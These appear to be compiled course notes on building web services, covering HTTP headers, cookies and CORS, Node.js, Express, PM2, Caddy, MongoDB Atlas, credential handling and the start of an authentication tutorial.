| 308  | Temporary redirect                                                                   | The resource is temporarily located at a different location. The temporary location is specified in the response location header. |
| 400  | Bad request                                                                          | The request was malformed or invalid.                                                                                             |
| 401  | Unauthorized                                                                         | The request did not provide a valid authentication token.                                                                         |
| 403  | Forbidden                                                                            | The provided authentication token is not authorized for the resource.                                                             |
| 404  | Not found                                                                            | An unknown resource was requested.                                                                                                |
| 408  | Request timeout                                                                      | The request takes too long.                                                                                                       |
| 409  | Conflict                                                                             | The provided resource represents an out of date version of the resource.                                                          |
| 418  | [I'm a teapot](https://en.wikipedia.org/wiki/Hyper_Text_Coffee_Pot_Control_Protocol) | The service refuses to brew coffee in a teapot.                                                                                   |
| 429  | Too many requests                                                                    | The client is making too many requests in too short of a time period.                                                             |
| 500  | Internal server error                                                                | The server failed to properly process the request.                                                                                |
| 503  | Service unavailable                                                                  | The server is temporarily down. The client should try again with an exponential back off.                                         |

## Headers

📖 **Deeper dive reading**: [MDN HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)

HTTP headers specify metadata about a request or response. This includes things like how to handle security, caching, data formats, and cookies. Some common headers that you will use include the following.

| Header                      | Example                              | Meaning                                                                                                                                                                        |
| --------------------------- | ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Authorization               | Bearer bGciOiJIUzI1NiIsI             | A token that authorized the user making the request.                                                                                                                           |
| Accept                      | image/\*                             | What content format the client accepts. This may include wildcards.                                                                                                            |
| Content-Type                | text/html; charset=utf-8             | The format of the response content. These are described using standard [MIME](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types) types. |
| Cookie                      | SessionID=39s8cgj34; csrftoken=9dck2 | Key value pairs that are generated by the server and stored on the client.                                                                                                     |
| Host                        | info.cern.ch                         | The domain name of the server. This is required in all requests.                                                                                                               |
| Origin                      | cs260.click                          | Identifies the origin that caused the request. A host may only allow requests from specific origins.                                                                           |
| Access-Control-Allow-Origin | https://cs260.click                  | Server response of what origins can make a request. This may include a wildcard.                                                                                               |
| Content-Length              | 368                                  | The number of bytes contained in the response.                                                                                                                                 |
| Cache-Control               | public, max-age=604800               | Tells the client how it can cache the response.                                                                                                                                |
| User-Agent                  | Mozilla/5.0 (Macintosh)              | The client application making the request.                                                                                                                                     |

## Body

The format of the body of an HTTP request or response is defined by the `Content-Type` header. For example, it may be HTML text (text/html), a binary image format (image/png), JSON (application/json), or JavaScript (text/javascript). A client may specify what formats it accepts using the `accept` header.

## Cookies

![Cookie](webServicesCookie.png)

HTTP itself is stateless. This means that one HTTP request does not know anything about a previous or future request. However, that does not mean that a server or client cannot track state across requests. One common method for tracking state is the `cookie`. Cookies are generated by a server and passed to the client as an HTTP header.

```http
HTTP/2 200
Set-Cookie: myAppCookie=tasty; SameSite=Strict; Secure; HttpOnly
```

The client then caches the cookie and returns it as an HTTP header back to the server on subsequent requests.

```http
HTTP/2 200
Cookie: myAppCookie=tasty
```

This allows the server to remember things like the language preference of the user, or the user's authentication credentials. A server can also use cookies to track, and share, everything that a user does. However, there is nothing inherently evil about cookies, the problem comes from web applications that use them as a means to violate a user's privacy or inappropriately monetize their data.

To combat this problem the `Same Origin Policy` (SOP) was created. Simply stated SOP only allows JavaScript to make requests to a domain if it is the same domain that the user is currently viewing. A request from `byu.iinstructure.com` for service endpoints that are made to `byu.instructure.com` would fail because the domains do not match. This provides significant security, but it also introduces complications when building web applications. For example, if you want build a service that any web application can use it would also violate the SOP and fail. In order to address this, the concept of Cross Origin Resource Sharing (CORS) was invented.

Going back to our hacker example, the HTTP request from the hacker site (`byu.iinstructure.com`) to the course's authentication service (`byu.instructure.com`) would look like the following.

```http
GET /api/auth/login HTTP/2
Host: byu.instructure.com
Origin: https://byu.iinstructure.com
```

In response the banking website would return:

```http
HTTP/2 200 OK
Access-Control-Allow-Origin: https://byu.instructure.com
```

The browser would then see that the actual origin of the request does not match the allowed origin and so the browser blocks the response and generates an error.

Fetch - 
Today, the fetch API is the preferred way to make HTTP requests. The fetch function is built into the browser's JavaScript runtime. This means you can call it from JavaScript code running in a browser.

The basic usage of fetch takes a URL and returns a promise. The promise then function takes a callback function that is asynchronously called when the requested URL content is obtained. If the returned content is of type application/json you can use the json function on the response object to convert it to a JavaScript object.

To do a POST request you populate the options parameter with the HTTP method and headers.

```js
fetch('https://jsonplaceholder.typicode.com/posts', {
  method: 'POST',
  body: JSON.stringify({
    title: 'test title',
    body: 'test body',
    userId: 1,
  }),
  headers: {
    'Content-type': 'application/json; charset=UTF-8',
  },
})
  .then((response) => response.json())
  .then((jsonResponse) => {
    console.log(jsonResponse);
  });
```

Node-
## Running programs

You can execute a line of JavaScript with Node.js from your console with the `-e` parameter.

```sh
➜  node -e "console.log(1+1)"
2
```

However, to do real work you need to execute an entire project composed of dozens or even hundreds of JavaScript files. You do this by creating a single starting JavaScript file, named something like `index.js`, that references the code found in the rest your project. You then execute your code by running `node` with index.js as a parameter. For example, with the following JavaScript saved to a file named `index.js`

```js
function countdown() {
  let i = 0;
  while (i++ < 5) {
    console.log(`Counting ... ${i}`);
  }
}

countdown();
```

We can execute the JavaScript by passed the file to node, and receive the following result.

```sh
➜  node index.js
Counting ... 1
Counting ... 2
Counting ... 3
Counting ... 4
Counting ... 5
```

You can also run node in interpretive mode by executing it without any parameters and then typing your JavaScript code directly into the interpreter.

```sh
➜ node
Welcome to Node.js v16.15.1.
> 1+1
2
> console.log('hello')
hello
```

## Node package manager

While you could write all of the JavaScript for everything you need, it is always helpful to use preexisting packages of JavaScript for implementing common tasks. To load a package using Node.js you must take two steps. First install the package locally on your machine using the Node Package Manager (NPM), and then include a `require` statement in your code that references the package name. NPM is automatically installed when you installed Node.js.

NPM knows how to access a massive repository of preexisting packages. You can search for packages on the [NPM website](https://www.npmjs.com/). However, before you start using NPM to install packages you need to initialize you code to use NPM. This is done by creating a directory that will contain your JavaScript and then running `npm init`. NPM will step you through a series of questions about the project you are creating. You can press the return key for each of questions if you want to accept the defaults. If you are always going to accept all of the defaults you can use `npm init -y` and skip the Q&A.

```sh
➜  mkdir npmtest
➜  cd npmtest
➜  npm init -y
```

## Package.json

If you list the files in directory you will notice that it has created a file named `package.json`. This file contains three main things: 1) Metadata about your project such as its name and the default entry JavaScript file, 2) commands that you can execute to do things like run, test, or distribute your code, and 3) packages that this project depends upon. With NPM initialized to work with your project, you can now use it to install a node package. As a simple example, we will install a package that knows how to tell jokes. This package is called `give-me-a-joke`. You can search for it on the [NPM website](https://www.npmjs.com/), see how often it is installed, examine the source code, and learn about who created it. You install the package using `npm install` followed by the name of the package.

```sh
➜  npm install give-me-a-joke
```

If you again examine the contents of the `package.json` file you will see a reference to the newly installed package dependency. If you decide you no longer want a package dependency you can always remove it with the `npm uninstall <package name here>` console command.

⚠ Note that when you start installing package dependencies NPM will create an additional file named `package-lock.json` and a directory named `node-modules` in your project directory. The `node-modules` directory contains the actual JavaScript for the package and all of its dependent packages. As you install several packages this directory will start to get very large. You do **not** want to check this directory into your source control system since it is so large and can be rebuilt using the information contained in the `package.json` and `package-lock.json` files. So make sure you include `node-modules` in your `.gitignore` file.

When you clone your source code from GitHub to a new location, just run `npm install` in the project directory. This will cause NPM to download all of the previously installed packages and recreate the `node-modules` directory. The `package-lock.json` file tracks the version of the package that you installed. That way if rebuild your `node-modules` directory you will have the version of the package you initially installed and not the latest available version, which might not be compatible with your code.

With NPM and the joke package installed, you can now use the package in a JavaScript file by referencing the package name as a parameter to the `require` function. This is then followed by a call the joke object's `getRandomDadJoke` function to actually generate a joke.

```js
const giveMeAJoke = require('give-me-a-joke');
giveMeAJoke.getRandomDadJoke((joke) => {
  console.log(joke);
});
```

If we run this code using node we get the following result.

```sh
➜  node index.js
What do you call a fish with no eyes? A fsh.
```

This may seem like a lot of work but after you do it a few times it will begin to feel natural. Just remember the main steps.

1. Create your project directory
1. Initialize it for use with NPM by running `npm init -y`
1. Make sure `.gitignore` file contains `node-modules`
1. Install any desired packages with `npm install <package name here>`
1. Add `require('<package name here>')` to your JavaScript code
1. Run your code with `node index.js`

## Creating a web service

With JavaScript we can write code that listens on a server port (e.g. 8080), receives HTTP requests, processes them, and then responds. We can use this to create a simple web service that we then execute using Node.js.

First create your project.

```sh
➜ mkdir webservicetest
➜ cd webservicetest
➜ npm init -y
```

Now, open VS Code and create a file named `index.js`. Paste the following code into the file and save.

```js
const http = require('http');
const server = http.createServer(function (req, res) {
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.write(`<h1>Hello Node.js! [${req.method}] ${req.url}</h1>`);
  res.end();
});

server.listen(8080, () => {
  console.log(`Web service listening on port 8080`);
});
```

This code uses the built in `http` package to create our HTTP server using the `http.createServer` function and provide it with a callback function that takes a request (`req`) and response (`res`) object. That function is called whenever the server receives an HTTP request. In our example, the callback always returns the same HTML snippet, with a status code of 200, and a Content-Type header, no matter what request is made. Basically this is just a simple dynamically generated HTML page. A real web service would examine the HTTP path and return meaningful content based upon the purpose of the endpoint.

The `server.listen` call starts listening on port 8080 and blocks until the program is terminated.

We execute the program by going back to our console window and running Node.js to execute our index.js file. If the service starts up correctly then it should look like the following.

```sh
➜ node index.js
Web service listening on port 8080
```

You can now open you browser and point it to `localhost:8080` and view the result. The interaction between the JavaScript, node, and the browser looks like this.

![Node HTTP](webServicesNodeHttp.jpg)

Use different URL paths in the browser and note that it will echo the HTTP method and path back in the document. You can kill the process by pressing `CTRL-C` in the console.

Note that you can also start up Node and execute the index.js code directly in VS Code. To do this open index.js in VS Code and press the 'F5' key. This should ask you what program you want to run. Select `node.js`. This starts up Node.js with the index.js file, but also attaches a debugger so that you can set breakpoints in the code and step through each line of code.

## Putting it all together

Here is a full example of our web service built using Express.

```js
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

// Third party middleware - Cookies
app.use(cookieParser());

app.post('/cookie/:name/:value', (req, res, next) => {
  res.cookie(req.params.name, req.params.value);
  res.send({ cookie: `${req.params.name}:${req.params.value}` });
});

app.get('/cookie', (req, res, next) => {
  res.send({ cookie: req.cookies });
});

// Creating your own middleware - logging
app.use((req, res, next) => {
  console.log(req.originalUrl);
  next();
});

// Built in middleware - Static file hosting
app.use(express.static('public'));

// Routing middleware
app.get('/store/:storeName', (req, res) => {
  res.send({ name: req.params.storeName });
});

app.put('/st*/:storeName', (req, res) => res.send({ update: req.params.storeName }));

app.delete(/\/store\/(.+)/, (req, res) => res.send({ delete: req.params[0] }));

// Error middleware
app.get('/error', (req, res, next) => {
  throw new Error('Trouble in river city');
});

app.use(function (err, req, res, next) {
  res.status(500).send({ type: err.name, message: err.message });
});

// Listening to a network port
const port = 8080;
app.listen(port, function () {
  console.log(`Listening on port ${port}`);
});
```

# PM2

When you run a program from the console the program will automatically terminate when you close the console or if the computer restarts. In order to keep programs running after a shutdown you need to register it as a `daemon`. The term daemon comes from the idea of something that is always there working in the background. Hopefully you only have good daemons running in your background.

We want our web services to continue running as a daemon. We would also like a easy way to start and stop our services. That is what [Process Manager 2](https://pm2.keymetrics.io/docs/usage/quick-start/) (PM2) does.

PM2 is already installed on your production server as part of the AWS AMI that you selected when you launched your server. Additionally, the deployment scripts found with the Simon projects automatically modify PM2 to register and restart your web services. That means you should not need to do anything with PM2. However, if you run into problems such as your services are not running, then here are some commands that you might find useful.

You can SSH into your server and see PM2 in action by running the following command.

```sh
pm2 ls
```

This should print out the two services, simon and startup, that are configured to run on your web server.

You can try some of the other commands, but only if you understand what they are doing. Using them incorrectly could cause your web services to stop working.

| Command                                                    | Purpose                                                                          |
| ---------------------------------------------------------- | -------------------------------------------------------------------------------- |
| **pm2 ls**                                                 | List all of the hosted node processes                                            |
| **pm2 monit**                                              | Visual monitor                                                                   |
| **pm2 start index.js -n simon**                            | Add a new process with an explicit name                                          |
| **pm2 start index.js -n startup -- 4000**                  | Add a new process with an explicit name and port parameter                       |
| **pm2 stop simon**                                         | Stop a process                                                                   |
| **pm2 restart simon**                                      | Restart a process                                                                |
| **pm2 delete simon**                                       | Delete a process from being hosted                                               |
| **pm2 delete all**                                         | Delete all processes                                                             |
| **pm2 save**                                               | Save the current processes across reboot                                         |
| **pm2 restart all**                                        | Reload all of the processes                                                      |
| **pm2 restart simon --update-env**                         | Reload process and update the node version to the current environment definition |
| **pm2 update**                                             | Reload pm2                                                                       |
| **pm2 start env.js --watch --ignore-watch="node_modules"** | Automatically reload service when index.js changes                               |
| **pm2 describe simon**                                     | Describe detailed process information                                            |
| **pm2 startup**                                            | Displays the command to run to keep PM2 running after a reboot.                  |
| **pm2 logs simon**                                         | Display process logs                                                             |
| **pm2 env 0**                                              | Display environment variables for process. Use `pm2 ls` to get the process ID    |

## Registering a new web service

If you want to setup another subdomain that accesses a different web service on your web server, you need to follow these steps.

1. Add the rule to the Caddyfile to tell it how to direct requests for the domain.
2. Create a directory and add the files for the web service.
3. Configure PM2 to host the web service.

### Modify Caddyfile

SSH into your server.

Copy the section for the startup subdomain and alter it so that it represents the desired subdomain and give it a different port number that is not currently used on your server. For example:

```sh
tacos.cs260.click {
  reverse_proxy _ localhost:5000
  header Cache-Control none
  header -server
  header Access-Control-Allow-Origin *
}
```

This tells Caddy that when it gets a request for tacos.cs260.click it will act as a proxy for those requests and pass them on to the web service that is listening on the same machine (localhost), on port 5000. The other settings tell Caddy to return headers that disable caching, hide the fact that Caddy is the server (no reason to tell hackers anything about your server), and to allow any other origin server to make endpoint requests to this subdomain (basically disabling CORS). Depending on what your web service does you may want different settings.

Restart Caddy to cause it to load the new settings.

```sh
sudo service caddy restart
```

Now Caddy will attempt to proxy the requests, but there is no web service listening on port 5000 and so you will get an error from Caddy if you make a request to tacos.cs260.click.

### Create the web service

Copy the ~/services/startup directory to a directory that represents the purpose of your service. For example:

cp -r ~/services/startup ~/services/tacos

If you list the directory you should see an `index.js` file that is the main JavaScript file for your web service. It has the code to listen on the designated network port and respond to requests. The following is the JavaScript that causes the web service to listen on a port that is provided as an argument to the command line.

```js
const port = process.argv.length > 2 ? process.argv[2] : 3000;
app.listen(port, () => {
  console.log(`Listening on port ${port}`);
});
```

There is also a directory named `public` that has static HTML/CSS/JavaScript files that your web service will respond with when requested. The index.js file enables this with the following code:

```js
app.use(express.static('public'));
```

You can start up the web service, listening on port 5000, using Node as follows.

```sh
node index.js 5000
```

You can now access your web service through the browser, or curl.

```sh
curl https://tacos.cs260.click
```

Caddy will receive the request and map the subdomain name, tacos.cs260.click, to a request for https://localhost:5000. Your web service is listening on port 5000 and so it receives the request and responds.

Stop your web service by pressing CTRL-C in the SSH console that you used to start the service. Now your browser request for your subdomain should return an error again.

### Configure PM2 to host the web service

The problem with running your web service from the console with `node index.js 5000`, is that as soon as you close your SSH session it will terminate all processes you started in that session, including your web service. Instead you need something that is always running in the background to run your web service. This is where daemons come into play. The daemon we use to do this is called PM2.

From your SSH console session run:

```sh
pm2 ls
```

This will list the web services that you already have registered with PM2. To run your newly created web service under PM2, make sure you are in your service directory, and run the command similar to the following, with the service name and port substituted to your desired values:

```sh
cd ~/services/tacos
pm2 start index.js -n tacos -- 5000
pm2 save
```

If you run `pm2 ls` again you should see your web service listed. You can now access your subdomain in the browser and see the proper response. PM2 will keep running your service even after you exit your SSH session.

# Data services

Web applications commonly need to store application and user data persistently. The data can be many things, but it is usually a representation of complex interrelated objects. This includes this like a user profile, organizational structure, game play information, usage history, billing information, peer relationship, library catalog, and so forth.

![Data service](dataService.jpg)

Historically SQL databases have served as the general purpose data service solution, but starting around 2010 specialty data services that better support document, graph, JSON, time, sequence, and key-value pair data began to take significant roles in applications from major companies. These data services are often called NoSQL solutions because they do not use the general purpose relational database paradigms popularized by SQL databases. However, they all have very different underlying data structures, strengths, and weaknesses. That means that you should not simply split all of the possible data services into two narrowly defined boxes, SQL and NoSQL, when you are considering the right data service for your application.

Here is a list of some of the popular data services that are available.

| Service       | Specialty             |
| ------------- | --------------------- |
| MySQL         | Relational queries    |
| Redis         | Memory cached objects |
| ElasticSearch | Ranked free text      |
| MongoDB       | JSON objects          |
| DynamoDB      | Key value pairs       |
| Neo4J         | Graph based data      |
| InfluxDB      | Time series data      |

## MongoDB

![MongoDB logo](webServicesMongoLogo.png)

For the projects in this course that require data services, we will use `MongoDB`. Mongo increases developer productivity by using JSON objects as its core data model. This makes it easy to have an application that uses JSON from the top to the bottom of the technology stack. A mongo database is made up of one or more collections that each contain JSON documents. You can think of a collection as a large array of JavaScript objects, each with a unique ID. The following is a sample of a collection of houses that are for rent.

```js
[
  {
    _id: '62300f5316f7f58839c811de',
    name: 'Lovely Loft',
    summary: 'A charming loft in Paris',
    beds: 1,
    last_review: {
      $date: '2022-03-15T04:06:17.766Z',
    },
    price: 3000,
  },
  {
    _id: '623010b97f1fed0a2df311f8',
    name: 'Infinite Views',
    summary: 'Modern home with infinite views from the infinity pool',
    property_type: 'House',
    beds: 5,
    price: 250,
  },
];
```

Unlike relational databases that require a rigid table definition where each column must be strictly typed and defined beforehand, Mongo has no strict schema requirements. Each document in the collection usually follows a similar schema, but each document may have specialized fields that are present, and common fields that are missing. This allows the schema of a collection to morph organically as the data model of the application evolves. To add a new field to a Mongo collection you just start insert the field into the documents as desired. If the field is not present, or has a different type in some documents, then the document simply doesn't match the query criteria when the field is referenced.

The query syntax for Mongo also follow a JavaScript inspired flavor. Consider the following queries on the houses for rent collection that was shown above.

```js
// find all houses
db.house.find();

// find houses with two or more bedrooms
db.house.find({ beds: { $gte: 2 } });

// find houses that are available with less than three beds
db.house.find({ status: 'available', beds: { $lt: 3 } });

// find houses with either less than three beds or less than $1000 a night
db.house.find({ $or: [(beds: { $lt: 3 }), (price: { $lt: 1000 })] });

// find houses with the text 'modern' or 'beach' in the summary
db.house.find({ summary: /(modern|beach)/i });
```

### Using MongoDB in your application

📖 **Deeper dive reading**: [MongoDB tutorial](https://www.mongodb.com/developer/languages/javascript/node-crud-tutorial/)

The first step to using Mongo in your application is to install the `mongodb` package using NPM.

```sh
➜ npm install mongodb
```

With that done you then use the `MongoClient` object to make a client connection to the database server. This requires a username, password, and the hostname of the database server.

```js
const { MongoClient } = require('mongodb');

const userName = 'holowaychuk';
const password = 'express';
const hostname = 'mongodb.com';

const uri = `mongodb+srv://${userName}:${password}@${hostname}`;

const client = new MongoClient(uri);
```

With the client connection you can then get a database object and from that a collection object. The collection object allows you to insert, and query for, documents. You do not have to do anything special to insert a JavaScript object as a Mongo document. You just call the `insertOne` function on the collection object and pass it the JavaScript object. When you insert a document, if the database or collection does not exists, Mongo will automatically create them for you. When the document is inserted into the collection it will automatically be assigned a unique ID.

```js
const collection = client.db('rental').collection('house');

const house = {
  name: 'Beachfront views',
  summary: 'From your bedroom to the beach, no shoes required',
  property_type: 'Condo',
  beds: 1,
};
await collection.insertOne(house);
```

To query for documents you use the `find` function on the collection object. Note that the find function is asynchronous and so we use the `await` keyword to wait for the promise to resolve before we write them out to the console.

```js
const cursor = collection.find();
const rentals = await cursor.toArray();
rentals.forEach((i) => console.log(i));
```

If you do not supply any parameters to the `find` function then it will return all documents in the collection. In this case we only get back the single document that we previously inserted. Notice that the automatically generated ID is returned with the document.

**Output**

```js
[
  {
    _id: new ObjectId('639a96398f8de594e198fc13'),
    name: 'Beachfront views',
    summary: 'From your bedroom to the beach, no shoes required',
    property_type: 'Condo',
    beds: 1,
  },
];
```

You can provide a query and options to the `find` function. In the example below we query for a `property_type` of Condo that has less than two bedrooms. We also specify the options to sort by descending price, and limit our results to the first 10 documents.

```js
const query = { property_type: 'Condo', beds: { $lt: 2 } };

const options = {
  sort: { price: -1 },
  limit: 10,
};

const cursor = collection.find(query, options);
const rentals = await cursor.toArray();
rentals.forEach((i) => console.log(i));
```

The query matches the document that we previously inserted and so we get the same result as before.

There is a lot more functionality that MongoDB provides, but this is enough to get you started. If you are interested you can explore the tutorials on their [website](https://www.mongodb.com/docs/).

## Managed services

Historically each application development team would have developers that managed the data service. Those developers would acquisition hardware, install the database software, monitor the memory, cpu, and disk space, control the data schema, and handle migrations and upgrades. Much of this work has now moved to services that are hosted and managed by a 3rd party. This relieves the development team from much of the day to day maintenance. The team can instead focus more on the application and less on the infrastructure. With a managed data service you simply supply the data and the service grows, or shrinks, to support the desired capacity and performance criteria.

### MongoDB Atlas

All of the major cloud providers offer multiple data services. For this class we will use the data service provided by MongoDB called [Atlas](https://www.mongodb.com/atlas/database). No credit card or payment is required to setup and use Atlas, as long as you stick to the shared cluster environment.

[![Mongo sign up](webServicesMongoSignUp.jpg)](https://www.mongodb.com/atlas/database)

⚠ This [video tutorial](https://www.youtube.com/watch?v=daIH4o75KE8) will step you through the process of creating your account and setting up your database. You really want to watch this video. Note that some of the Atlas website interface may be slightly different, but the basic concepts should all be there is some shape or form. The main steps you need to take are:

1. Create your account.
1. Create a database cluster.
1. Create your root database user credentials. Remember these for later use.
1. ⚠ Set network access to your database to be available from anywhere.

   ![Atlas IP Anywhere](webServicesMongoIpAnywhere.gif)

1. Copy the connection string and use the information in your code.
1. Save the connection and credential information in your production and development environments as instructed above.

You can always find the connection string to your Atlas cluster by pressing the `Connect` button from your Database > DataServices view.

![Atlas connection string](webServicesMongoConnection.gif)

## Keeping your keys out of your code

You need to protect your credentials for connecting to your Mongo database. One common mistake is to check them into your code and then post it to a public GitHub repository. Instead you can load your credentials when the application executes. One common way to do that is to have a JSON configuration file that contains the credentials that you dynamically load into the JavaScript that makes the database connection. You then use the configuration file in your development environment and deploy it to your production environment, but you **never** commit it to GitHub.

In order to accomplish this do the following:

1. Create a file named `dbConfig.json` in the same directory as the database JavaScript (e.g. `database.js`) that you use to make database requests.
1. Insert your Mongo DB credentials into the `dbConfig.json` file in JSON format using the following example:

   ```json
   {
     "hostname": "cs260.abcdefg.mongodb.net",
     "userName": "myMongoUserName",
     "password": "toomanysecrets"
   }
   ```

1. Import the `dbConfig.json` content into your database.js file using a Node.js require statement and use the data that it represents to create the connection URL.

   ```js
   const config = require('./dbConfig.json');
   const url = `mongodb+srv://${config.userName}:${config.password}@${config.hostname}`;
   ```

⚠ Make sure you include `dbConfig.json` in your `.gitignore` file so that it does not get pushed up to GitHub.

### Testing the connection on startup

It is nice to know that your connection string is correct before your application attempts to access any data. We can do that when the application starts by making an asynchronous request to ping the database. If that fails than either the connection string is incorrect, the credentials are invalid, or the network is not working. The following is an example of testing the Connection

```js
const config = require('./dbConfig.json');

const url = `mongodb+srv://${config.userName}:${config.password}@${config.hostname}`;
const client = new MongoClient(url);
const db = client.db('rental');

(async function testConnection() {
  await client.connect();
  await db.command({ ping: 1 });
})().catch((ex) => {
  console.log(`Unable to connect to database with ${url} because ${ex.message}`);
  process.exit(1);
});
```

If your server is not starting, then check your logs for this exception being thrown.

## Using Mongo from your code

With that all done, you should be good to use Atlas from both your development and production environments. You can test that things are working correctly with the following example.

```js
const { MongoClient } = require('mongodb');
const config = require('./dbConfig.json');

async function main() {
  // Connect to the database cluster
  const url = `mongodb+srv://${config.userName}:${config.password}@${config.hostname}`;
  const client = new MongoClient(url);
  const db = client.db('rental');
  const collection = db.collection('house');

  // Test that you can connect to the database
  (async function testConnection() {
    await client.connect();
    await db.command({ ping: 1 });
  })().catch((ex) => {
    console.log(`Unable to connect to database with ${url} because ${ex.message}`);
    process.exit(1);
  });

  // Insert a document
  const house = {
    name: 'Beachfront views',
    summary: 'From your bedroom to the beach, no shoes required',
    property_type: 'Condo',
    beds: 1,
  };
  await collection.insertOne(house);

  // Query the documents
  const query = { property_type: 'Condo', beds: { $lt: 2 } };
  const options = {
    sort: { score: -1 },
    limit: 10,
  };

  const cursor = collection.find(query, options);
  const rentals = await cursor.toArray();
  rentals.forEach((i) => console.log(i));
}

main().catch(console.error);
```

To execute the above example, do the following:

1. Create a directory called `mongoTest`
1. Save the above content to a file named `index.js`
1. Create a file named `dbConfig.json` that contains your database credentials
1. Run `npm init -y`
1. Run `npm install mongodb`
1. Run `node index.js`.

This should output something like the following if everything is working correctly.

```js
{
_id: new ObjectId("639b51b74ef1e953b884ca5b"),
name: 'Beachfront views',
summary: 'From your bedroom to the beach, no shoes required',
property_type: 'Condo',
beds: 1
}
```

## Connecting to the database

We use a cloud service called MongoDB Atlas for our database service. Once we are connected to Atlas, we can make service calls to MongoDB from our web service. This involves specifying the database service endpoint and making database calls like the following.

```Javascript
const { MongoClient } = require('mongodb');

const url = `mongodb+srv://${userName}:${password}@${hostname}`;
const client = new MongoClient(url);
client.connect(err => {
  const collection = client.db("test").collection("devices");

  // ... perform actions on the DB collection

  client.close();
});

```

## Create a MongoDB Atlas cluster

Before you can start writing your own code you need to get a MongoDB Atlas account and create a database cluster that you can use as your database service. If you have not done that yet go back and review the instruction on data services.

## Handling credentials

Make sure you follow the instruction given previously about providing and protecting your MongoDB credentials in a file named `dbConfig.json`. This file will get deployed to production with the `deployService.sh` script.

## Working with the database

The `database.js` file contains the functions for getting and adding high scores. The database functions are called from the `getScores` and `submitScores` endpoints found in `index.js`.

# Account creation and login

The first step towards supporting authentication in your web application is providing a way for users to uniquely identify themselves. This usually requires two service endpoints. One to initially `create` an authentication credential, and a second to authenticate, or `login`, on future visits. Once a user is authenticated we can control access to other endpoints. For example, web services often have a `getMe` endpoint that gives information about the currently authenticated user. We will implement this endpoint to demonstrate that authentication is actually working correctly.

## Endpoint design

Using HTTP we can map out the design of each of our endpoints.

### Create authentication endpoint

This takes an email and password and returns a cookie containing the authentication token and user ID. If the email already exists it returns a 409 (conflict) status code.

```http
POST /auth/create HTTP/2
Content-Type: application/json

{
  "email":"marta@id.com",
  "password":"toomanysecrets"
}
```

```http
HTTP/2 200 OK
Content-Type: application/json
Set-Cookie: auth=tokenHere

{
  "id":"337"
}
```

### Login authentication endpoint

This takes an email and password and returns a cookie containing the authentication token and user ID. If the email does not exist or the password is bad it returns a 401 (unauthorized) status code.

```http
POST /auth/login HTTP/2
Content-Type: application/json

{
  "email":"marta@id.com",
  "password":"toomanysecrets"
}
```

```http
HTTP/2 200 OK
Content-Type: application/json
Set-Cookie: auth=tokenHere

{
  "id":"337"
}

```

### GetMe endpoint

This uses the authentication token stored in the cookie to look up and return information about the authenticated user. If the token or user do not exist it returns a 401 (unauthorized) status code.

```http
GET /user/me HTTP/2
Cookie: auth=tokenHere
```

```http
HTTP/2 200 OK
Content-Type: application/json

{
  "email":"marta@id.com"
}

```

## Web service

With our service endpoints designed, we can now build our web service using Express.

```js
const express = require('express');
const app = express();

app.post('/auth/create', async (req, res) => {
  res.send({ id: 'user@id.com' });
});

app.post('/auth/login', async (req, res) => {
  res.send({ id: 'user@id.com' });
});

const port = 8080;
app.listen(port, function () {
  console.log(`Listening on port ${port}`);
});
```

Follow these steps, and then add in the code from the sections that follow. There is a copy of the final version of the example at the end of this instruction. If you get lost, or things are not working as expected, refer to the final version.

1. Create a directory called `authTest` that we will work in.
1. Save the above content to a file named `main.js`. This is our starting web service.
1. Run `npm init -y` to initial the project to work with node.js.
1. Run `npm install express cookie-parser mongodb uuid bcrypt` to install all of the packages we are going to use.
1. Run `node main.js` or press `F5` in VS Code to start up the web service.
1. You can now open a console window and use curl to try out one of the endpoints.

   ```sh
   ➜  curl -X POST localhost:8080/auth/create

   {"id":"user@id.com"}
   ```

## Handling requests

With our basic service created, we can now implement the create authentication endpoint. The first step is to read the credentials from the body of the HTTP request. Since the body is designed to contain JSON we need to tell Express that it should parse HTTP requests, with a content type of `application/json`, automatically into a JavaScript object. We do this by using the `express.json` middleware. We can then read the email and password directly out of the `req.body` object. We can test that this is working by temporarily including them in the response.

```js
app.use(express.json());

app.post('/auth/create', (req, res) => {
  res.send({
    id: 'user@id.com',
    email: req.body.email,
    password: req.body.password,
  });
});
```

```sh
➜  curl -X POST localhost:8080/auth/create -H 'Content-Type:application/json' -d '{"email":"marta@id.com", "password":"toomanysecrets"}'

{"id":"user@id.com","email":"marta@id.com","password":"toomanysecrets"}
```

Now that we have proven that we can parse the request bodies correctly, we can change the code to add a check to see if we already have a user with that email address. If we do, then we immediately return a 409 (conflict) status code. Otherwise we create a new user and return the user ID.

```js
app.post('/auth/create', async (req, res) => {
  if (await getUser(req.body.email)) {
    res.status(409).send({ msg: 'Existing user' });
  } else {
    const user = await createUser(req.body.email, req.body.password);
    res.send({
      id: user._id,
    });
  }
});
```

## Using the database

We want to persistently store our users in Mongo and so we need to set up our code to connect to and use the database. This code is explained in the instruction on data services if you want to review what it is doing.

```js
const { MongoClient } = require('mongodb');

const userName = process.env.MONGOUSER;
const password = process.env.MONGOPASSWORD;
const hostname = process.env.MONGOHOSTNAME;

const url = `mongodb+srv://${userName}:${password}@${hostname}`;
const client = new MongoClient(url);
const collection = client.db('authTest').collection('user');
```

With a Mongo collection object we can implement the `getUser` and `createUser` functions.

```js
function getUser(email) {
  return collection.findOne({ email: email });
}

async function createUser(email, password) {
  const user = {
    email: email,
    password: password,
    token: 'xxx',
  };
  return collection.insertOne(user);
}
```

But, we are missing a couple of things. We need to a real authentication token, and we cannot simply store a clear text password in our database.

## Generating authentication tokens

To generate a reasonable authentication token we use the `uuid` package. [UUID](https://en.wikipedia.org/wiki/Universally_unique_identifier) stands for Universally Unique Identifier, and it does a really good job creating a hard to guess, random, unique ID.

```js
const uuid = require('uuid');

token: uuid.v4();
```

## Securing passwords

Next we need to securely store our passwords. Failing to do so is a major security concern. If, and it has happened to many major companies, a hacker is able to access the database, they will have the passwords for all of your users. This may not seem like a big deal if your application is not very valuable, but users often reuse passwords. That means you will also provide the hacker with the means to attack the user on many other websites.

So instead of storing the password directly, we want to cryptographically hash the password so that we never store the actual password. When we want to validate a password during login, we can hash the login password and compare it to our stored hash of the password.

